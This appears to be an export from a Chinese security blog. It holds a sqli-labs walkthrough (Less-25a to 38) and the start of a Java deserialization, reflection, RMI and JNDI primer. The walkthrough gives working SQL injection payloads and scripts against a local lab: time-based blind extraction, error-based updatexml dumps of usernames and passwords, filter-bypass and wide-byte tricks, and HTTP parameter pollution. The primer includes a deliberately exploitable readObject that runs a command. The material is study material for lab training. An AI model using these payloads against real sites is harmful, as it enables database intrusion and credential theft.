url=\"http://192.168.3.7/sqli/Less-25a/?id=1 \" payload=\"%26%26 if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)\" info=\"\" flag=0 for i in range(1,33): if flag: break left=0x20 right=0x7f while 1: mid=left+(right-left)//2 if left==mid: if mid==0x20: flag=1 break info=info+chr(left) print(info) break startTime=time.time() tmppayload=url+payload.format(i,mid) requests.get(tmppayload) endTime=time.time() spendTime=endTime-startTime if spendTime &gt;=3: right=mid else: left=midbinary() Less-26过滤如下面的blacklist,过滤了注释、空格、or、and 123456789101112131415161718192021222324252627282930function blacklist($id)&#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out -- $id= preg_replace('/[#]/',\"\", $id); //Strip out # $id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes return $id;&#125; $id= blacklist($id); $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; 可以写一个脚本判断过滤了什么 1234567891011121314151617181920212223242526import requestsfrom bs4 import BeautifulSoupsqlDict=['--', 'or', '%26', '%23', 'OR', 'and', 'length', 'handler', 'like', 'select', 'sleep', 'database', 'delete', 'having', 'as', '-~', 'BENCHMARK', 'limit', 'left', 'select', 'insert', 'right', 'INFORMATION', '--', ';', '!', '%', 'xor', '&lt;&gt;', '(', '&gt;', '&lt;', ')', '.', '^', '=', 'AND', 'BY', 'CAST', 'COLUMN', 'COUNT', 'CREATE', 'END', 'case', \"'1'='1\", 'when', \"admin'\", '\"', 'length', 'length', 'REVERSE', 'ascii', 'select', 'database', 'left', 'right', 'union', '\"', '||', 'oorr', '/', '//', '//*', '*/*', '/**/', 'anandd', 'GROUP', 'HAVING', 'IF', 'INTO', 'JOIN', 'LEAVE', 'LEFT', 'LEVEL', 'sleep', 'LIKE', 'NAMES', 'NEXT', 'NULL', 'OF', 'ON', '|', 'infromation_schema', 'user', 'OR', 'ORDER', 'ORD', 'SCHEMA', 'SELECT', 'SET', 'TABLE', 'THEN', 'UNION', 'UPDATE', 'USER', 'USING', 'VALUE', 'VALUES', 'WHEN', 'WHERE', 'ADD', 'AND', 'prepare', 'set', 'update', 'delete', 'drop', 'inset', 'CAST', 'COLUMN', 'CONCAT', 'GROUP_CONCAT', 'group_concat', 'CREATE', 'DATABASE', 'DATABASES', 'alter', 'DELETE', 'DROP', 'floor', 'rand()', 'information_schema.tables', 'TABLE_SCHEMA', 'concat_ws()', 'concat', 'LIMIT', 'ORD', 'ON', 'extractvalue', 'order', 'CAST()', 'by', 'ORDER', 'OUTFILE', 'RENAME', 'REPLACE', 'SCHEMA', 'SELECT', 'SET', 'updatexml', 'SHOW', 'SQL', 'TABLE', 'THEN', 'TRUE', 'instr', 'benchmark', 'format', 'bin', 'substring', 'ord', 'UPDATE', 'VALUES', 'VARCHAR', 'VERSION', 'WHEN', 'WHERE', '/*', '`', ',', 'users', 'mid', 'for', 'BEFORE', 'REGEXP', 'RLIKE', 'in', 'sys', 'schema', 'sp ace', 'SEPARATOR', 'XOR', 'CURSOR', 'FLOOR', 'sys.schema_table_statistics_with_buffer', 'INFILE', 'count', 'from', '=', '@', 'else']url = \"http://192.168.3.7/sqli/Less-26/?id=1\"#关键字过滤def sql_filter(): valueFilter=[] #记录过滤的关键字 for value in sqlDict: targetUrl = url + value res = requests.get(targetUrl) soup=BeautifulSoup(res.text,\"lxml\") text=soup.select('font[color=\"#33FFFF\"]')[0].string.strip() #输入关键字返回的位置 if \"%\" in value and value !=\"%\":#对特殊字符进行处理 value=chr(int(value.replace(\"%\",\"0x\"),16)) if value not in text: flag=0 #判断关键字是否是已经保存的过滤关键字的子串 for vf in valueFilter: if vf.lower() in value.lower(): flag=1 break if flag==0: valueFilter.append(value.lower()) print(\"Filter keywords:\"+value) print(valueFilter)sql_filter() tips: 空格过滤 123456%09 TAB 键（水平）%0a 新建一行%0b TAB 键（垂直）%0c 新的一页%0d return 功能%a0 空格 可以写个脚本判断判断哪些 URL 编码能够代替空格 123456789101112131415import requestsdef changeToHex(num): tmp = hex(i).replace(\"0x\", \"\") if len(tmp)&lt;2: tmp = '0' + tmp return \"%\" + tmpreq = requests.session()for i in range(0,256): i = changeToHex(i) url = \"http://192.168.3.7/sqli/Less-26/?id=1'\" + i + \"%26%26\" + i + \"'1'='1\" ret = req.get(url) if 'Dumb' in ret.text: print(\"this can use:\" + i) 运行结果 12345678910111213this can use:%09this can use:%0athis can use:%0bthis can use:%0cthis can use:%0dthis can use:%20this can use:%22this can use:%23this can use:%27this can use:%2athis can use:%2dthis can use:%2fthis can use:%5c 具体还要一一一下在linux下这里可以用%a0绕过 注意点：在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux 下无这个问题。 我这里是window环境，就使用括号将空格来绕过空格 1http://192.168.3.7/sqli/Less-26/?id=1'||(updatexml(1,concat(0x5e,database(),0x5e),1))||%27%27=%27 爆表 1http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database()),0x7e),1)||'1'='1 爆字段 1http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='users'),0x7e),1)||'1'='1 爆数据这里有一个知识点，因为要绕过空格，所以limit 就不能用了，但是updatexml（）只能爆32位，如果要爆的数据过多，就没有办法了。所以我们这里再使用一个在盲注中用过的函数 substr() 12http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,substr(concat(0x7e,(select(group_concat(passwoorrd))from(users)),0x7e),1,32),1)||'1'='1http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,substr(concat(0x7e,(select(group_concat(passwoorrd))from(users)),0x7e),33,64),1)||'1'='1 Less-26a在没有过滤时，第一件事是判断注入类型，是字符型还是数字型。而有过滤时，判断注入类型后最重要的就是判断过滤条件。但无错误回显时，如何区分是被过滤还是被转为整型呢？ 注入类型1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。判断是否有小括号 2’&amp;&amp;’1’=’1若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。 1’)||’1’=(‘1若查询语句有小括号正确回显，若无小括号错误回显（无回显）。 answer: 123456789101112131415161718192021222324252627282930313233343536import timeimport requestsdef binary(): url=\"http://192.168.3.7/sqli/Less-26a/?id=1')\" #payload=\"%26%26if((ascii(substr((select(database())),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1\" #payload=\"%26%26if((ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1\" #payload = \"%26%26if((ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1\" payload=\"%26%26if((ascii(substr((select(group_concat(username))from(users)),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1\" info=\"\" flag=0 for i in range(1,33): if flag: break left=0x20 right=0x7f while 1: mid=left+(right-left)//2 if left==mid: if mid==0x20: flag=1 break info=info+chr(left) print(info) break startTime=time.time() tmppayload=url+payload.format(i,mid) requests.get(tmppayload) endTime=time.time() spendTime=endTime-startTime if spendTime &gt;=3: right=mid else: left=midbinary() Less-2712345678910111213141516function blacklist($id)&#123;$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union/s',\"\", $id); //Strip out union$id= preg_replace('/select/s',\"\", $id); //Strip out select$id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION$id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT$id= preg_replace('/Union/s',\"\", $id); //Strip out Union$id= preg_replace('/Select/s',\"\", $id); //Strip out selectreturn $id;&#125; select和union可以大小写绕过 1http://192.168.3.7/sqli/Less-27/?id=1'%26%26(updatexml(1,concat(0x7e,(SelEct(user())),0x7e),1))%26%26'1'='1 Less-27a1http://192.168.3.7/sqli/Less-27a/?id=1\"%26%26sleep(3)%26%26\"1 Less-28123456789101112function blacklist($id)&#123;$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.//$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out UNION &amp; SELECT.return $id;&#125; answer: 1http://192.168.3.7/sqli/Less-28/?id=1')%26%26sleep(3)%26%26('1 Less-28a123456789101112function blacklist($id)&#123;//$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*//$id= preg_replace('/[--]/',\"\", $id); //Strip out --.//$id= preg_replace('/[#]/',\"\", $id); //Strip out #.//$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.//$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.//$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out spaces.return $id;&#125; Less-29进入的index.php，那个页面没起到拦截作用 ，所以应进Less-29/Login.php 12345678910111213141516171819202122232425262728293031323334353637383940 $qs = $_SERVER['QUERY_STRING']; $hint=$qs; $id1=java_implimentation($qs); $id=$_GET['id']; //echo $id1; whitelist($id1); function whitelist($input)&#123; $match = preg_match(\"/^\\d+$/\", $input); if($match) &#123; //echo \"you are good\"; //return $match; &#125; else &#123; header('Location: hacked.php'); //echo \"you are bad\"; &#125;&#125;function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(\"&amp;\",$q_s); foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); if($val==\"id\") &#123; $id_value=substr($value,3,30); return $id_value; echo \"&lt;br&gt;\"; break; &#125; &#125;&#125; tips:HTTP参数污染（HPP）HPP方法主要用于服务器两层架构服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache服务器请求数据。数据返回路径则相反。所以重点：index.php?id=1&amp;id=2，到底是显示 id=1 的数据还是显示 id=2 的？Explain：apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第一个参数，即显示 id=1 的内容。 对于几个主要的服务器，其对多个参数的获取情况归纳如下： answer:假如传入两个id ,java_implimentation会对第一个id进行过滤处理 $_GET[&#39;id&#39;]得到的是第二个id的值。 所以这里可以使用第二个id绕过过滤。 1http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,group_concat(username,0x23,password) from users --+ Less-30双引号闭合，其他跟Less-29一样 Less-31“)闭合，其他跟Less-30一样 Less-32宽字节注入 12345678910111213141516171819202122232425function check_addslashes($string)&#123; $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string); //escape double quote with a backslash return $string;&#125;// take the variables if(isset($_GET['id']))&#123;$id=check_addslashes($_GET['id']);//echo \"The filtered request is :\" .$id . \"&lt;br&gt;\";//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity mysql_query(\"SET NAMES gbk\");$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。 answer: 1192.168.3.7&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,group_concat(username) from users--+ Less-33和上题目一样宽字节注入 12345678910function check_addslashes($string)&#123; $string= addslashes($string); return $string;&#125;$id=check_addslashes($_GET['id']);mysql_query(\"SET NAMES gbk\");$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; Less-34POST形式的宽字节注入 Less-35整型宽字节注入 12345function check_addslashes($string)&#123; $string = addslashes($string); return $string;&#125; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。单引号（’）双引号（”）反斜杠（\\）NULL Less-3612345function check_quotes($string)&#123; $string= mysql_real_escape_string($string); return $string;&#125; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 1234567\\x00\\n\\r\\'\"\\x1a answer: 1http://192.168.3.7/sqli/Less-36/?id=%df' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+ Less-37Less-38","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"https://blog.cfyqy.com/tags/sql%E6%B3%A8%E5%85%A5/"}],"author":"ye1s"},{"title":"java安全基础","slug":"ava反序列化学习","date":"2020-05-31T13:55:00.000Z","updated":"2021-04-13T02:41:14.421Z","comments":true,"path":"article/9d8837ef.html","link":"","permalink":"https://blog.cfyqy.com/article/9d8837ef.html","excerpt":"java反序列化漏洞是java中比较常见的漏洞。","text":"java反序列化漏洞是java中比较常见的漏洞。 基础概念定义 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程。反序列化即逆过程，由字节流还原成对象。注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。 用途 1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中2） 在网络上传送对象的字节序列 应用场景1)一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。2)在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。 漏洞原由 如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。 API实现 操作 类名 方法 方法作用 序列化 Java.io.ObjectOutputStream writeObject() 该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中 反序列化 java.io.ObjectInputStream readObject() 该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 注意：实现Serializable和Externalizable接口的类的对象才能被序列化 反序列化漏洞利用例子：readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法。如果该方法书写不当的话就有可能引发恶意代码的执行。 Ye1s类 123456789101112131415161718import java.io.ObjectInputStream;import java.io.Serializable;public class Ye1s implements Serializable &#123; private String cmd; private void readObject(ObjectInputStream stream) throws Exception&#123; stream.defaultReadObject(); Runtime.getRuntime().exec(cmd); &#125; public String getCmd() &#123; return cmd; &#125; public void setCmd(String cmd) &#123; this.cmd = cmd; &#125;&#125; Main 1234567891011121314151617181920212223import java.io.*;public class Main &#123; public static void main(String[] args) throws Exception&#123; Ye1s ye1s=new Ye1s(); ye1s.setCmd(\"calc\"); byte[] serializeData=serialize(ye1s); System.out.println(serializeData); unserilize(serializeData); &#125; public static byte[] serialize(final Object obj) throws Exception&#123; ByteArrayOutputStream btout=new ByteArrayOutputStream(); ObjectOutputStream objOut=new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); &#125; public static Object unserilize(final byte[] serialized) throws Exception&#123; ByteArrayInputStream bthin=new ByteArrayInputStream(serialized); ObjectInputStream objIn=new ObjectInputStream(bthin); return objIn.readObject(); &#125;&#125; java反射Java反射(Reflection)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。 其实在Java中定义的一个类本身也是一个对象，即java.lang.Class类的实例，这个实例称为类对象 类对象表示正在运行的 Java 应用程序中的类和接口 类对象没有公共构造方法，由 Java 虚拟机自动构造 类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法 获取类对象假设现在有一个User类 123456789101112131415package reflection;public class User &#123; private String name; public User(String name) &#123; this.name=name; &#125; public void setName(String name) &#123; this.name=name; &#125; public String getName() &#123; return name; &#125;&#125; 要获取该类对象一般有三种方法 123class.forName(\"reflection.User\")User.classnew User().getClass() 最常用的是第一种，通过一个字符串即类的全路径名就可以得到类对象，另外两种方法依赖项太强 利用类对象创建对象与new直接创建对象不同，反射是先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。 12345678910package reflection;import java.lang.reflect.Constructor; public class CreateObject &#123; public static void main(String[] args) throws Exception&#123; Class UserClass=Class.forName(\"reflection.User\"); Constructor constructor=UserClass.getConstructor(String.class); User user=(User) constructor.newInstance(\"ye1s\"); System.out.println(user.getName()); &#125;&#125; 方法 说明 getConstructor(Class…&lt;?&gt; parameterTypes) 获得该类中与参数类型匹配的公有构造方法 getConstructors() 获得该类的所有公有构造方法 getDeclaredConstructor(Class…&lt;?&gt; parameterTypes) 获得该类中与参数类型匹配的构造方法 getDeclaredConstructors() 获得该类所有构造方法 通过反射调用方法 12345678910111213141516package reflection;import java.lang.reflect.Constructor;import java.lang.reflect.Method;public class CallMethod &#123; public static void main(String[] args) throws Exception&#123; Class UserClass=Class.forName(\"reflection.User\"); Constructor constructor=UserClass.getConstructor(String.class); User user=(User)constructor.newInstance(\"ye1s\"); Method method=UserClass.getMethod(\"setName\", String.class); method.invoke(user,\"yesi\"); System.out.println(user.getName()); &#125;&#125; 方法 说明 getMethod(String name, Class…&lt;?&gt; parameterTypes) 获得该类某个公有的方法 getMethods() 获得该类所有公有的方法 getDeclaredMethod(String name, Class…&lt;?&gt; parameterTypes) 获得该类某个方法 getDeclaredMethods() 获得该类所有方法 通过反射访问属性 12345678910111213141516package reflection;import java.lang.reflect.Constructor;import java.lang.reflect.Field;public class AccessAttribute &#123; public static void main(String[] args) throws Exception &#123; Class UserClass=Class.forName(\"reflection.User\"); Constructor constructor=UserClass.getConstructor(String.class); User user=(User)constructor.newInstance(\"ye1s\"); Field field=UserClass.getDeclaredField(\"name\"); field.setAccessible(true);// name是私有属性，需要先设置可访问 field.set(user,\"yesi\"); System.out.println(user.getName()); &#125;&#125; 方法 说明 getField(String name) 获得某个公有的属性对象 getFields() 获得所有公有的属性对象 getDeclaredField(String name) 获得某个属性对 getDeclaredFields() 获得所有属性对象 利用java反射执行代码 12345678910package reflection;public class Exec &#123; public static void main(String[] args) throws Exception&#123; Class runtimeClass=Class.forName(\"java.lang.Runtime\"); Object runtime=runtimeClass.getMethod(\"getRuntime\").invoke(null); runtimeClass.getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); &#125;&#125; JAVA 代理机制详情可看此文章：https://xz.aliyun.com/t/9197 代理模式Java当中最常用的设计模式之一。其特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。而Java的代理机制分为静态代理和动态代理。 动态代理又分为jdk动态代理和CGLIB动态代理。 Java动态代理位于Java.lang.reflect包下，我们一般就仅涉及Java.lang.reflect.Proxy类与InvocationHandler接口,使用其配合反射，完成实现动态代理的操作。 InvocationHandler接口：负责提供调用代理操作。 是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。Proxy类：负责动态构建代理类 提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。 1234567getProxyClass(ClassLoader,Class&lt;?&gt;...)：获取指定类加载器和动态代理类对象。 newProxyInstance(ClassLoader,Class&lt;?&gt;[],InvocationHandler)：指定类加载器，一组接口，调用处理器； isProxyClass(Class&lt;?&gt;)：判断获取的类是否为一个动态代理类; getInvocationHandler(Object)：获取指定代理类实例查找与它相关联的调用处理器实例; JAVASSISTJavassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。 ClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。CtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。CtMethods：表示类中的方法。CtFields ：表示类中的字段。 ClassPool获取 classpool 对象 1234// 获取 ClassPool 对象，使用系统默认类路径ClassPool pool = new ClassPool(true);// 效果与 new ClassPool(true) 一致ClassPool pool1 = ClassPool.getDefault(); 获取类 1234// 通过类名获取 CtClass，未找到会抛出异常CtClass ctClass = pool.get(\"org.test.demo.DemoService\");// 通过类名获取 CtClass，未找到返回 null，不会抛出异常CtClass ctClass1 = pool.getOrNull(\"org.test.demo.DemoService\"); 创建类 123456// 复制一个类，创建一个新类CtClass ctClass2 = pool.getAndRename(\"org.test.demo.DemoService\", \"org.test.demo.DemoCopyService\");// 通过类名，创建一个新类CtClass ctClass3 = pool.makeClass(\"org.test.demo.NewDemoService\");// 通过文件流，创建一个新类，注意文件必须是编译后的 class 文件，不是源代码文件。CtClass ctClass4 = pool.makeClass(new FileInputStream(new File(\"./customize/DemoBeforeHandler.class\"))); 添加类搜索路径 12345678910111213141516171819202122232425// 将类搜索路径插入到搜索路径之前pool.insertClassPath(new ClassClassPath(this.getClass()));// 将类搜索路径添加到搜索路径之后pool.appendClassPath(new ClassClassPath(this.getClass()));// 将一个目录作为类搜索路径pool.insertClassPath(\"/usr/local/javalib\");CtClasspublic static void main(String[] args) throws Exception &#123; ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.get(\"javassist.test02.Person\"); //类名 String name = ctClass.getName(); //包名 String packageName = ctClass.getPackageName(); //父类 CtClass superclass = ctClass.getSuperclass(); //接口 CtClass[] interfaces = ctClass.getInterfaces(); System.out.println(name); System.out.println(packageName); System.out.println(superclass.getName()); System.out.println(interfaces[0].getName());&#125; CtMethod 123456789101112// 在方法体前插入代码块ctMethod.insertBefore(\"\");// 在方法体后插入代码块ctMethod.insertAfter(\"\");// 在某行 字节码 后插入代码块ctMethod.insertAt(10, \"\");// 添加参数ctMethod.addParameter(CtClass);// 设置方法名ctMethod.setName(\"newName\");// 设置方法体ctMethod.setBody(\"System.out.println(123);\"); 例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package poc;import javassist.*;import java.lang.reflect.Constructor;import java.lang.reflect.Method;public class JavassistDemo &#123; public static void main(String[] args) throws Exception&#123; // 获取 ClassPool 对象，使用系统默认类路径 ClassPool classPool = ClassPool.getDefault(); // 创建一个空类 CtClass ctClass = classPool.makeClass(\"Test\"); // 新增 String 类型字段 name CtField name = new CtField(classPool.get(String.class.getName()), \"name\", ctClass); // 新增 int 类型字段 age CtField age = new CtField(classPool.get(int.class.getName()), \"age\", ctClass); // 设置修饰符 private name.setModifiers(Modifier.PRIVATE); age.setModifiers(Modifier.PRIVATE); //添加到类里 ctClass.addField(name); ctClass.addField(age); // 无参构造方法 CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass); // 有参构造方法 CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]&#123;classPool.get(String.class.getName()), CtClass.intType&#125;, ctClass); // 方法体 ctConstructor.setBody(\"&#123;name=\\\"test\\\";age=12;&#125;\"); // 方法体 $0 代表this $1 $2 方法参数 name age ctConstructor1.setBody(\"&#123;$0.name = $1;$0.age = $2;&#125;\"); ctClass.addConstructor(ctConstructor); ctClass.addConstructor(ctConstructor1); //创建 getter setter 方法 CtMethod setName = CtNewMethod.setter(\"setName\", name); CtMethod getName = CtNewMethod.getter(\"getName\", name); CtMethod getAge = CtNewMethod.getter(\"getAge\", age); CtMethod setAge = CtNewMethod.setter(\"setAge\", age); ctClass.addMethod(setName); ctClass.addMethod(getName); ctClass.addMethod(getAge); ctClass.addMethod(setAge); //新增方法 CtMethod printName = new CtMethod(new CtClass(String.class.getName()) &#123; @Override public String toString() &#123; return super.toString(); &#125; &#125;, \"printInfo\", new CtClass[]&#123;&#125;, ctClass); // 设置方法修饰符 public printName.setModifiers(Modifier.PUBLIC); // 设置方法体 printName.setBody(\"&#123;return \\\"my name is \\\"+name+\\\",\\\" + \\\"age is \\\"+age;&#125;\"); ctClass.addMethod(printName); // 写入文件 ctClass.writeFile(\"D:\\\\test\"); //将创建的ctClass加载至当前线程的上下文类加载器中 Class clz = ctClass.toClass(); //反射调用 Constructor declaredConstructor = clz.getDeclaredConstructor(String.class, int.class); Object obj = declaredConstructor.newInstance(\"liangzi\", 100); Method printInfo = clz.getMethod(\"printInfo\"); System.out.println(printInfo.invoke(obj)); &#125;&#125; JAVA RMI详情可看JAVA RMI 反序列化知识详解 JAVA本身提供了一种RPC框架 RMI及Java 远程方法调用(Java Remote Method Invocation),可以在不同的Java 虚拟机之间进行对象间的通讯,RMI是基于JRMP协议(Java Remote Message Protocol Java远程消息交换协议)去实现的。 RMI调用逻辑: RMI主要分为三部分 RMI Registry注册中心 Client 客户端 RMI Server服务端 样例如下： 创建注册中心HelloRegistry.java 1234567891011121314import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;public class HelloRegistry &#123; public static void main(String[] args) &#123; try&#123; LocateRegistry.createRegistry(1099); &#125;catch (RemoteException e)&#123; e.printStackTrace(); &#125; while (true); &#125;&#125; RMI Server服务端 先创建一个继承java.rmi.Remote的接口 HelloInterface.java 123 public interface HelloInterface extends java.rmi.Remote &#123; public String sayHello(String from) throws java.rmi.RemoteException;&#125; 继承UnicastRemoteObject类,实现上面的接口 HelloImpl.java 123456789101112 import java.rmi.server.UnicastRemoteObject;public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123; public HelloImpl() throws java.rmi.RemoteException &#123; super(); &#125; @Override public String sayHello(String from) throws java.rmi.RemoteException &#123; System.out.println(\"Hello from \" + from + \"!!\"); return \"sayHello\"; &#125;&#125; 写服务端的启动类,用于创建远程对象注册表和注册远程对象 1234567891011121314151617 import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class HelloServer &#123; public static void main(String[] args) &#123; try&#123; String rmiName=\"ye1s\"; Registry registry = LocateRegistry.getRegistry(1099); registry.bind(rmiName,new HelloImpl()); &#125;catch (RemoteException | AlreadyBoundException e)&#123; e.printStackTrace(); &#125; &#125;&#125; 连接注册服务 查找ye1s对象 12345678910111213141516import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class HelloClient &#123; public static void main(String[] args) &#123; try &#123; Registry registry = LocateRegistry.getRegistry(1099); HelloInterface hello = (HelloInterface) registry.lookup(\"ye1s\"); System.out.println(hello.sayHello(\"flag\")); &#125; catch (NotBoundException | RemoteException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 对于Naming和LocateRegistry的理解可以从下面的文章了解java.rmi.Naming和java.rmi.registry.LocateRegistry的区别 攻击方式服务端攻击注册中心注册中心攻击客户端客户端攻击注册中心 JAVA JNDI注入详情可看Java安全之JNDI注入:https://www.anquanke.com/post/id/201181 JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。 这些命名/目录服务提供者: RMI (JAVA远程方法调用) LDAP (轻量级目录访问协议) CORBA (公共对象请求代理体系结构) DNS (域名服务) JNDI客户端调用方式 123456//指定需要查找name名称String jndiName= \"jndiName\";//初始化默认环境Context context = new InitialContext();//查找该name的数据context.lookup(jndiName); 这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值,如果JNDI名称可控的话可能会被攻击。 服务端代码如下： 1234567891011121314151617181920package demo;import 